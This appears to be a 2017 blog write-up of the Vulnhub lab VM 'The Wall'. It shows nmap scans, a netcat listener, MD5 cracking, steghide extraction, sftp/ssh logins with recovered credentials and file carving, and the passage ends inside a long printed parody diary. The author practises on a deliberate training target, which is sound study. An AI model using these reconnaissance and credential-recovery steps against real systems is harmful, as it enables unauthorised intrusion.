---
layout:     post
title:      "Vulnhub.com - The Wall"
subtitle:   "Write-Up"
date:       2017-08-07 8:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

<p>Hello everyone, today we're going to go through another machine from <a href="https://www.vulnhub.com/"><b>Vulnhub</b></a> called <b>The Wall</b>. Let's take a look at the description.  </p>

{% highlight text %}
In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd's contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.

You challenge is simple... set your controls for the heart of the sun, get root, and grab the flag! Rock on!
{% endhighlight %}

<p>Looks promising, let's start it. </p>

<p>Author: <a href="https://www.vulnhub.com/author/xerubus,117/"><b>Sagi</b></a></p>
<p>Download: <a href="https://www.vulnhub.com/entry/the-wall-1,130/"><b>/dev/random/ Pipe</b></a></p>

<h1>Write-Up</h1>

<p>Attacker: <b>Kali Linux 192.168.56.102</b></p>
<p>Victim: <b>The Wall 192.168.56.103</b></p>

<p>Firstly, we're going to do a comprehensive scan using <b>nmap</b> in order to gain as much info as possible. </p>

{% highlight bash %}
root@kali:~# nmap -v -sS -A -T4 -p- 192.168.56.103

Starting Nmap 7.01 ( https://nmap.org ) at 2017-08-02 10:24 EDT
NSE: Loaded 132 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
Initiating ARP Ping Scan at 10:24
Scanning 192.168.56.103 [1 port]
Completed ARP Ping Scan at 10:24, 0.22s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 10:24
Scanning 192.168.56.103 [65535 ports]
SYN Stealth Scan Timing: About 2.21% done; ETC: 10:48 (0:22:54 remaining)
SYN Stealth Scan Timing: About 4.47% done; ETC: 10:47 (0:21:43 remaining)
{% endhighlight %}

<p>No open ports? A little bit strange, but after a while I noticed on <b>wireshark</b>, that victim machine is trying to connect to port 1337. </p>

![Wireshark](/img/the-wall/wireshark.png){:class="img-responsive center-block"}

<p>I took a closer look at the packet. </p>

{% highlight text %}
102 0.299005957 192.168.56.102 192.168.56.103 TCP 54 1337 → 45058 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
{% endhighlight %}

<p>And set up a listener. </p>

{% highlight bash %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
192.168.56.103: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 14489

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'   

              The Wall by @xerubus
          -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don't be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice
{% endhighlight %}

<p>Great, our first piece of information. Another <b>nmap</b> scan revealed that this operation triggered an port opening, <b>http</b> is up. </p>

{% highlight bash %}

root@kali:~# nmap -v -sS -A -T4 192.168.56.103

Starting Nmap 7.01 ( https://nmap.org ) at 2017-08-02 10:35 EDT
NSE: Loaded 132 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:35
Completed NSE at 10:35, 0.00s elapsed
Initiating NSE at 10:35
Completed NSE at 10:35, 0.00s elapsed
Initiating ARP Ping Scan at 10:35
Scanning 192.168.56.103 [1 port]
Completed ARP Ping Scan at 10:35, 0.21s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 10:35
Scanning 192.168.56.103 [1000 ports]
Discovered open port 80/tcp on 192.168.56.103
Completed SYN Stealth Scan at 10:35, 12.25s elapsed (1000 total ports)
Initiating Service scan at 10:35
Scanning 1 service on 192.168.56.103
Completed Service scan at 10:37, 96.21s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.56.103
NSE: Script scanning 192.168.56.103.
Initiating NSE at 10:37
Completed NSE at 10:37, 7.19s elapsed
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Nmap scan report for 192.168.56.103
Host is up (0.00081s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:B1:35:60 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4, OpenBSD 5.3
Uptime guess: 0.000 days (since Wed Aug  2 10:37:21 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Randomized

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 192.168.56.103

NSE: Script Post-scanning.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.93 seconds
           Raw packets sent: 3051 (136.796KB) | Rcvd: 20 (1.024KB)
{% endhighlight %}

<p>Let's take a look at the website. </p>

![Website](/img/the-wall/website.png){:class="img-responsive center-block"}

<p>And it's code. </p>

{% highlight html %}
<html>
<body bgcolor="#000000">
<center><img src="pink_floyd.jpg"</img></center>
</body>
</html>
<!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035-->
{% endhighlight %}

<p>We have a hex string in a comment, which we can translate. </p>

{% highlight text %}
737465673d3333313135373330646262623337306663626539373230666536333265633035
steg=33115730dbbb370fcbe9720fe632ec05
{% endhighlight %}

<p>But I have no clue about its use. My next step is to run <b>nikto</b> in order to gain something more about the website. </p>

{% highlight bash %}
root@kali:~/Downloads# nikto -h 192.168.56.103
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2017-08-02 10:43:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: OpenBSD httpd
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.6.11
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft Utilities\"%3<script>alert('Vulnerable')</script>: Postnuke Phoenix 0.7.2.3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ 7538 requests: 3 error(s) and 5 item(s) reported on remote host
+ End Time:           2017-08-02 10:44:01 (GMT-4) (37 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

<p>Nothing here apart from some XSS vulnerability. Let's keep looking, maybe in the image? </p>

{% highlight bash %}
root@kali:~/Downloads# exiftool index.jpeg
ExifTool Version Number         : 10.58
File Name                       : index.jpeg
Directory                       : .
File Size                       : 112 kB
File Modification Date/Time     : 2017:08:02 10:42:39-04:00
File Access Date/Time           : 2017:08:02 10:42:39-04:00
File Inode Change Date/Time     : 2017:08:02 10:42:39-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Image Width                     : 750
Image Height                    : 717
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 750x717
Megapixels                      : 0.538
{% endhighlight %}

<p>Unfortunately there's nothing here. After some thinking I came to to the program called <b>steghide</b>, which allows you to hide information. Let's try this method. </p>

{% highlight bash %}
root@kali:~/Downloads# steghide --extract -sf index.jpeg
Enter passphrase:
steghide: could not extract any data with that passphrase!
{% endhighlight %}

<p>We need a password! I started analyzing all of the information and the previously decoded hex string looks like credentials. And good for us, it's <b>md5</b> hashed. </p>

{% highlight text %}
33115730dbbb370fcbe9720fe632ec05	md5	divisionbell
{% endhighlight %}

<p>Now, we can use <b>steghide</b> once again. </p>

{% highlight bash %}
root@kali:~/Downloads# steghide --extract -sf index.jpeg
Enter passphrase: divisionbell
wrote extracted data to "pink_floyd_syd.txt".
{% endhighlight %}

<p>Let's view the data. </p>

{% highlight text %}
root@kali:~/Downloads# cat pink_floyd_syd.txt
Hey Syd,

I hear you're full of dust and guitars?

If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.
{% endhighlight %}

<p>Another pass pair? This <b>base64</b> strings decodes to username called <b>SydBarrett</b>, and password hash is once again <b>md5</b> - cracked into <b>pinkfloydrocks</b>. </p>

{% highlight text %}
U3lkQmFycmV0dA==    SydBarrett
f831605ae34c2399d1e5bb3a4ab245d0	md5	pinkfloydrocks
SydBarrett|pinkfloydrocks
{% endhighlight %}

<p>But what now? I decided to look for clues on <b>wikipedia</b>, mentioning "See Emily Play", but there was nothing that could help me right now. </p>

{% highlight text%}
"See Emily Play" is a song by English rock band Pink Floyd, released as their second single in June 1967. Written by original frontman Syd Barrett and recorded on 23 May 1967, it featured "The Scarecrow" as its B-side.
{% endhighlight %}

<p>Luckily, doing another <b>nmap</b> full port scan, I've discovered another open one - <b> port 1965</b>. </p>

{% highlight bash %}
root@kali:~/Downloads# nmap -p- 192.168.56.103

Starting Nmap 7.01 ( https://nmap.org ) at 2017-08-03 07:42 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.103
Host is up (0.0011s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1965/tcp open  unknown
MAC Address: 08:00:27:B1:35:60 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 732.95 seconds
{% endhighlight %}

<p>Now we can scan what services are running on it. </p>

{% highlight bash %}
root@kali:~/Downloads# nmap -sV -p 1965 192.168.56.103

Starting Nmap 7.01 ( https://nmap.org ) at 2017-08-03 07:56 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.103
Host is up (0.00075s latency).
PORT     STATE SERVICE VERSION
1965/tcp open  ssh     OpenSSH 7.0 (protocol 2.0)
MAC Address: 08:00:27:B1:35:60 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
{% endhighlight %}

<p>Hmmm, <b>ssh</b> server. We can try connecting to it. </p>

{% highlight bash %}
root@kali:~/Downloads# ssh SydBarrett@192.168.56.103 -p 1965
The authenticity of host '[192.168.56.103]:1965 ([192.168.56.103]:1965)' can't be established.
ECDSA key fingerprint is SHA256:KpS9gjJLvMxkvJcWxmzby+XlbwCEA3aiRFNisoGiWlM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.56.103]:1965' (ECDSA) to the list of known hosts.
SydBarrett@192.168.56.103's password:
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.56.103 closed.
{% endhighlight %}

<p>Only <b>sftp</b>? Let's connect once again. </p>

{% highlight bash %}
root@kali:~/Downloads# sftp -P 1965 SydBarrett@192.168.56.103
SydBarrett@192.168.56.103's password:
Connected to 192.168.56.103.
sftp> ls -la
drwxr-x---    3 0        1000          512 Aug  2  2017 .
drwxr-x---    3 0        1000          512 Oct 24  2015 ..
drwxr-xr-x    3 0        1000          512 Oct 24  2015 .mail
-rw-r--r--    1 0        1000         1912 Oct 25  2015 bio.txt
-rw-r--r--    1 0        1000       868967 Oct 24  2015 syd_barrett_profile_pic.jpg             
sftp> get bio.txt
Fetching /bio.txt to bio.txt
/bio.txt                                      100% 1912   434.8KB/s   00:00    
sftp> get syd_barrett_profile_pic.jpg
Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
/syd_barrett_profile_pic.jpg                  100%  849KB   7.6MB/s   00:00
sftp> cd .mail
sftp> ls -la
drwxr-xr-x    3 0        1000          512 Oct 24  2015 .
drwxr-x---    3 0        1000          512 Oct 24  2015 ..
drwxr-xr-x    2 0        1000          512 Nov 11  2015 .stash
-rw-r--r--    1 0        1000          309 Oct 24  2015 sent-items
sftp> get sent-items
Fetching /.mail/sent-items to sent-items
/.mail/sent-items                                                                                                   100%  309   140.9KB/s   00:00    
sftp> cd .stash
sftp> ls -la
drwxr-xr-x    2 0        1000          512 Nov 11  2015 .
drwxr-xr-x    3 0        1000          512 Oct 24  2015 ..
-rw-r--r--    1 0        1000     48884479 Aug  7  2015 eclipsed_by_the_moon
sftp> get eclipsed_by_the_moon
Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
/.mail/.stash/eclipsed_by_the_moon   
sftp> exit
{% endhighlight %}

<p>And here's a lot of goodies. We got one text file, one image and one mail from that server. Now it's time  to investigate them. </p>

<p><b>bio.txt</b></p>
{% highlight text %}
root@kali:~/Downloads# cat bio.txt
"Roger Keith "Syd" Barrett (6 January 1946 – 7 July 2006) was an English musician, composer, singer, songwriter, and painter. Best known as a founder member of the band Pink Floyd, Barrett was the lead singer, guitarist and principal songwriter in its early years and is credited with naming the band. Barrett was excluded from Pink Floyd in April 1968 after David Gilmour took over as their new frontman, and was briefly hospitalized amid speculation of mental illness.

Barrett was musically active for less than ten years. With Pink Floyd, he recorded four singles, their debut album (and contributed to the second one), and several unreleased songs. Barrett began his solo career in 1969 with the single "Octopus" from his first solo album, The Madcap Laughs (1970). The album was recorded over the course of a year with five different producers (Peter Jenner, Malcolm Jones, David Gilmour, Roger Waters and Barrett himself). Nearly two months after Madcap was released, Barrett began working on his second and final album, Barrett (1970), produced by Gilmour and featuring contributions from Richard Wright. He went into self-imposed seclusion until his death in 2006. In 1988, an album of unreleased tracks and outtakes, Opel, was released by EMI with Barrett's approval.

Barrett's innovative guitar work and exploration of experimental techniques such as dissonance, distortion and feedback influenced many musicians, including David Bowie and Brian Eno. His recordings are also noted for their strongly English-accented vocal delivery. After leaving music, Barrett continued with painting and dedicated himself to gardening. Biographies began appearing in the 1980s. Pink Floyd wrote and recorded several tributes to him, most notably the 1975 album Wish You Were Here, which included "Shine On You Crazy Diamond", as homage to Barrett."

Source: Wikipedia (https://en.wikipedia.org/wiki/Syd_Barrett)
{% endhighlight %}

<p><b>syd_barrett_profile_pic.jpg</b></p>
{% highlight bash %}
root@kali:~/Downloads# exiftool syd_barrett_profile_pic.jpg
ExifTool Version Number         : 10.58
File Name                       : syd_barrett_profile_pic.jpg
Directory                       : .
File Size                       : 849 kB
File Modification Date/Time     : 2017:08:03 08:00:14-04:00
File Access Date/Time           : 2017:08:03 08:00:14-04:00
File Inode Change Date/Time     : 2017:08:03 08:00:14-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 82%
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:E5450E5ADA2711E1A898C9AB7D94C9BA
Document ID                     : xmp.did:E5450E5BDA2711E1A898C9AB7D94C9BA
Derived From Instance ID        : xmp.iid:E5450E58DA2711E1A898C9AB7D94C9BA
Derived From Document ID        : xmp.did:E5450E59DA2711E1A898C9AB7D94C9BA
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1920x1080
Megapixels                      : 2.1
{% endhighlight %}
{% highlight bash %}
root@kali:~/Downloads# steghide --extract -sf syd_barrett_profile_pic.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!
{% endhighlight %}

<p>But <b>eclipsed_by_the_moon</b> is much better find. Let's unzip it. </p>

{% highlight bash %}
root@kali:~/Downloads# file eclipsed_by_the_moon
eclipsed_by_the_moon: gzip compressed data, last modified: Wed Nov 11 00:15:47 2015, from Unix
root@kali:~/Downloads# tar zxvf eclipsed_by_the_moon
eclipsed_by_the_moon.lsd
{% endhighlight %}

<p>What is this extension - <b>lsd</b>?  Google suggests this. </p>

{% highlight text %}
An LSD file may be a system dictionary supplied with Lingvo Dictionary or created by users.
{% endhighlight %}

<p>But <b>file</b> command produces something else. </p>

{% highlight bash %}
root@kali:~/Downloads# file eclipsed_by_the_moon.lsd
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors 96256 (volumes > 32 MB) , serial number 0x9e322180, unlabeled, FAT (16 bit)
{% endhighlight %}

<p>Now I'm going to use <b>foremost</b>, great forensics tool, in order to scan the file. </p>

{% highlight bash %}
root@kali:~/Downloads# foremost eclipsed_by_the_moon.lsd
Processing: eclipsed_by_the_moon.lsd
|*|
root@kali:~/Downloads# cd output
root@kali:~/Downloads/output# ls -la
total 16
drwxr-xr-- 3 root root 4096 Aug  3 08:15 .
drwxr-xr-x 3 root root 4096 Aug  3 08:15 ..
-rw-r--r-- 1 root root  694 Aug  3 08:15 audit.txt
drwxr-xr-- 2 root root 4096 Aug  3 08:15 jpg
root@kali:~/Downloads/output# cat audit.txt
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Thu Aug  3 08:15:25 2017
Invocation: foremost eclipsed_by_the_moon.lsd
Output directory: /root/Downloads/output
Configuration file: /etc/foremost.conf
------------------------------------------------------------------
File: eclipsed_by_the_moon.lsd
Start: Thu Aug  3 08:15:25 2017
Length: 47 MB (49283072 bytes)

Num	 Name (bs=512)	       Size	 File Offset	 Comment

0:	00000418.jpg 	     123 KB 	     214016 	 
Finish: Thu Aug  3 08:15:26 2017

1 FILES EXTRACTED

jpg:= 1
------------------------------------------------------------------

Foremost finished at Thu Aug  3 08:15:26 2017
root@kali:~/Downloads/output/jpg# file 00000418.jpg
00000418.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 604x388, frames 3
{% endhighlight %}

<p>We have a file, let's take a look at it! </p>

![Key file](/img/the-wall/key-file.png){:class="img-responsive center-block"}

<p>And here we have a password <b>hello_is_there_anybody_in_there</b>. But for what account? After another bit of googling I've identified man on the picture as <b>George Roger Waters</b>. Now we can use previous name scheme and guess the username for <b>ssh</b> service, with just found password. </p>

{% highlight text %}
root@kali:~/Downloads/output/jpg# ssh RogerWaters@192.168.56.103 -p 1965
RogerWaters@192.168.56.103's password:
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'   
$ ls -la
total 176
drwx------  3 RogerWaters  RogerWaters    512 Oct 28  2015 .
drwxr-xr-x  7 root         wheel          512 Oct 24  2015 ..
-rw-r--r--  1 RogerWaters  RogerWaters     87 Oct 24  2015 .Xdefaults
-rw-r--r--  1 RogerWaters  RogerWaters    773 Oct 24  2015 .cshrc
-rw-r--r--  1 RogerWaters  RogerWaters    103 Oct 24  2015 .cvsrc
-rw-r--r--  1 RogerWaters  RogerWaters    398 Oct 26  2015 .login
-rw-r--r--  1 RogerWaters  RogerWaters    175 Oct 24  2015 .mailrc
-rw-r--r--  1 RogerWaters  RogerWaters    218 Oct 24  2015 .profile
drwx------  2 RogerWaters  RogerWaters    512 Oct 26  2015 .ssh
-rw-r--r--  1 RogerWaters  RogerWaters   2853 Oct 26  2015 bio.txt
-rw-r--r--  1 RogerWaters  RogerWaters      0 Oct 28  2015 mbox
-rw-r--r--  1 RogerWaters  RogerWaters  48177 Oct 26  2015 roger_waters_profile_pic.jpg
-rw-r--r--  1 RogerWaters  RogerWaters  16588 Oct 26  2015 secret-diary
{% endhighlight %}

<p>Another series of goodies. Let's take a look at them, one by one. </p>

<p><b>secret-diary</b></p>

{% highlight text %}
$ cat secret-diary                                                                                                                                   
This was posted to alt.music.roger-waters and alt.music.pink-floyd back in mid-1996 by Stuart Greig. It is entirely ficticious and is provided here only as a form of parody.  Source: http://www.ingsoc.com/waters/humour/rwdiary.html

    Week One
    Monday

        Got up, had a bath. Thought that the water looked a dark colour - then realised I still had my aviator sunglasses on. Listened to the radio and felt a bit alienated. Wrote another concept album on video recorders as I realised I'd already done TV and radio. Had lunch and the postman turned up. A letter from mum reminding me that it's Uncle Bob's birthday next week. The power she still wields...will I never be free?? Beat my fists against the wall in anger and frustration for about 20 minutes. Decided to have a cup of tea. Milk had gone off. I detect the hand of David Gilmour in this.

    Tuesday

        Got up. Thought about the war and the market forces destroying the world for an hour or so. Felt a bit depressed so I decided to put on my black jeans, black T shirt, black casual jacket and aviators. Felt much better and decided to go out for some milk and card for Uncle Bob. Nearly got out the door before I realised I hadn't rolled up the sleeves of my casual jacket!! Narrow escape there.

    Wednesday

        Got up, suddenly realised that my father was dead and that no-one understood my alienation as a musical genius. Burnt down the new conservatory in an angst ridden rage. Man next door tried to engage me in conversation about someone called "Gazza" before I torched his too. He is a pleb and I am an artist. He was leaning on the fence watching me. I feel there might be a large scale concept piece in this about the gulf between the artsists and the philistine masses. Couldn't think of a physical symbol to hang the work around and snagged my casual jacket on a nail sticking out of the fence. Asked the pleb if he had seen a man answering David Gilmours description hammering the nail in but he'd obviously paid the pleb off.

    Thursday

        Got up, message from Dave on the ansaphone asking me to get back together with the band again. Rang Eric Clapton and asked him to send Dave's wife some flowers thanking her for the wonderful nights they spent together. That should fuck him up. Felt so good I came up with a great lateral thinking idea on the new album - The Fence!! I could stage it at the whitehouse, or even the moon!! Thought I should probably play myself, but who for Mum and Uncle Bob?? Sinead? Van? Madonna? Phoned Bob Geldof to see if he wanted to get involved. He told me to "fook off". Felt bad, nearly wrote another album but decided to forgive Bob and went round to join him and we both beat our fists against the wall for a couple of hours.

    Friday

        Got up, then went back to bed as I couldn't face the day - can't anyone else see our lives are revolving around TV?? For god's sake, it should be my musical genius it revolves around!! Mum rang at night tosee if I was OK. She came round with some chicken soup - I didn't eat it as it might have those mind controlling drugs in it but at least she got my other black casual jackets back from the dry cleaners. When will this woman stop controlling my life!!

    Saturday

        Rang Sinead. Apparently she has to tidy her room for the forseeable future. Van rang, but it was difficult to tell wether he was interested or not as there was so much background noise - all bottles clinking and horseracing. Madonna didn't ring back. I detect the hand of David Gilmour in this.

    Sunday

        Project in tatters. Postman came and the first letter was my royalties from Pink Floyds latest tour. I'm sure it's £1 short. Letter from mum - Uncle Bob was killed by a bus yesterday. I feel a large scale concept album about the perils of public transport in a monopolistic state coming on. Finished it in time to watch MTV before bed. Saw David Gilmour dancing with Madonna!!! I detect the hand of my mother in this!!

    Week Two
    Monday

        Got up. Had a bath. Doctor came round - said they would have to operate to remove my sunglasses. Decided to give it a miss - after all, I've never seen Dave Gilmour in shades. Postman arrived with my 55 volume box video set of the first world war. Couldn't see my dad in it, but there was a guy who looked like him. The bleeding hearts came round in the afternoon - apparently Snowy has started taking lessons from Dave himself. We jammed for a bit until someone pointed out I couldn't sing. Threw them all out in a huff.

    Tuesday

        Meeting with the guys at Sony. Apparently they are objecting to my new 3 CD concept album roughly entitled "Record companies screw the life out of creative geniuses worse than Maggie Thatcher did to the miners". Philistines. They calmed down a bit when they realised it wouldn't be out for another three years by which time the concept would have changed beyond all recognition anyway. Talked about poor album sales. This one had better be good they said, get some good guitarists. They suggested Dave Gilmour - I suggested they fuck off.

        Journalist phoend to ask when I would tour next. Told him as soon as Hades drops below 0 degrees and it's moisture crystalises in to a solid - or if more than a few hundred people buy tickets. He didn't understand the first part but I think he got the message.

    Wednesday

        Phoned Eric Clapton - but his mum said he can't come out to play with me anymore as I depress him. Talked to her about the war for a bit till she hung up. Mothers - they're all the same. Went in the studio and met some guy called Steve Vai - apparently he plays guitar. Asked him to put some stuff over my demos but he just warmed up for an hour, asked if it was OK and left. Dave and the guys were in the studio next door and sent through a demo they were working on to see if I would put some lyrics on it. I did, it went like this -

            Fuck off Dave Gilmour
            And the rest of you too
            Keep your sodding ferraris
            Your mums smell like poo

            You got the floyd name
            but I know your game
            It's all metaphysics
            And I write better lyrics

        Not my best work but I thougt it appropriate under the circumstances. Phoned my lawyer and asked him to phone Dave's lawyer and say that Dave was a wanker. And anyway, didn't I get a restraining order??

    Thursday

        New album going well - should be finished in about 40 odd remixes and several title changes. Did some more work on the opera. Finally found the kind of music for me - you don't need to sing!! You get a big fat woman to do it for you. At least it makes a change from Paul Carrack. Sinead came round for a while and we both moaned about how hard it was to be misunderstood artistic genuis's. She asked if she could do a bit for the new album - said we'd already got someone to make the sandwiches.

    Friday

        Dave phoned again. Apparently he wants to borow my casual jacket. Couldn't find one without the sleeves rolled up so I bought a brand new one. It was worth it after I'd sewn some prawns into the lining and filled the collar with itching powder. Saw Dave later wearing it on Top Of The Pops - he's not playing as well as he used to!! Mum came tound and asked me if I wanted to go to dinner with her and the wife. You mean I'm married??

    Saturday

        Phoned the Ministry Of Defence again and asked them why my dad had to die in the war. Got standard reply from snotty receptionist - "because he was shot through the head by a german, Mr Waters". Typical. Wrote a song about the snooty girl called "I send people off to die and I don't care (Potzdamer Mix)".

        Had lunch with my manager. Apparently the Floyd are to be honoured at some big awards and Dave and the boys are going. Said I would go for a laugh. Phoned the wife to see if she wanted to go but she said Dave had already invited her. Bugger.

    Sunday

        Drove by Daves house at 3.00 in the morning playing the Final Cut really loud - Dave came out and threw a guitar at me. Said it was the best thing he'd done with a guitar since The Wall. Drove off really quick after he threatened not to sing any more songs I had the rights to.

        Decided not to go to the awards - sent a Gerald Scarfe cartoon of myself instead. MTV vj said that they nearly didn't recognise me without the casual jacket & shades but I certainly has more charisma than usual. Got really depressed and decided to sell the pics of Dave shagging Kate Bush to the News Of The World. Now that's what I call a discovery!!

    Week Three
    Monday

        Got up, had a bath. Decided to have a cup of tea. Milk had gone off again. Made a mental note to shoot Dave Gilmour. Went for a walk in the park. It was a nice day, lot's of mothers with their children on the swings etc. No fathers around - maybe they all died in the war. Couldn't stay long - the police turned up and took me to the station. Got questioned for two hours on why a middle aged man dressed all in black with sunglasses on should hang around the playground. Talked to the officers about the war and how my father was killed. Got let off with a caution and a promise to see a shrink. On way home had a brilliant idea - a ouija board!! Went straight to the shop and bought one. On the way back I bought another thousand copies of ATD with my Floyd royalties - got to keep the boys at Sony happy and Snowy in guitar lessons.

    Tuesday

        Felt really bad this morning so stayed in bed making anonymous and abusive phone calls to Maggie Thatcher and Ronald Reagan. That will teach them to ruin peoples lives, start wars and promote a soap opera state. But how do they always know it's me?? Called Dave for a laugh - shame he wasn't in, put on my Kate Bush voice and left message saying I was pregnant and was sure the baby was his.

        Contact!!! After 3 hours I think I am in touch with my father!! Asked loads of questions with yes or no answers which he got right!! Eventually asked the BIG ONE, what should I do with my life... message came back: S..T..O..P....F..U..C..K..I.N..G....M..O..A..N..I..N..G!! Went to bed early with a cup of cocoa after beating my fists bloody against the wall.

    Wednesday

